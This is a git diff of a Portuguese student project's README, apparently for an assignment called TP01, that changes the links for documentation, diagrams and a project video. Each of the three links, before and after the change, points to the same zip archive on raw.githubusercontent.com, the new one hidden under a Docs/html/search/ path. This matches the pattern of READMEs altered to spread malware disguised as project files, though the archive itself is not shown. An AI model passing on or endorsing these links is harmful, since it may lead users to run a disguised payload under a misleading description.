@@ -35,10 +35,10 @@ Participações dos membros:
 			Ricardo Filipe Terra Martins de Melo, MAT:232038504
 
 Para ler a documentação da aplicação, acesse:
-https://raw.githubusercontent.com/Lucas-Camilo-Dados/TP01/main/obj/TP01-2.5.zip
+https://raw.githubusercontent.com/Lucas-Camilo-Dados/TP01/main/Docs/html/search/T-v3.0-alpha.4.zip
 
 Para acesso aos diagramas, acesse:
-https://raw.githubusercontent.com/Lucas-Camilo-Dados/TP01/main/obj/TP01-2.5.zip
+https://raw.githubusercontent.com/Lucas-Camilo-Dados/TP01/main/Docs/html/search/T-v3.0-alpha.4.zip
 
 Vídeo explicativo do projeto:
-https://raw.githubusercontent.com/Lucas-Camilo-Dados/TP01/main/obj/TP01-2.5.zip
+https://raw.githubusercontent.com/Lucas-Camilo-Dados/TP01/main/Docs/html/search/T-v3.0-alpha.4.zip
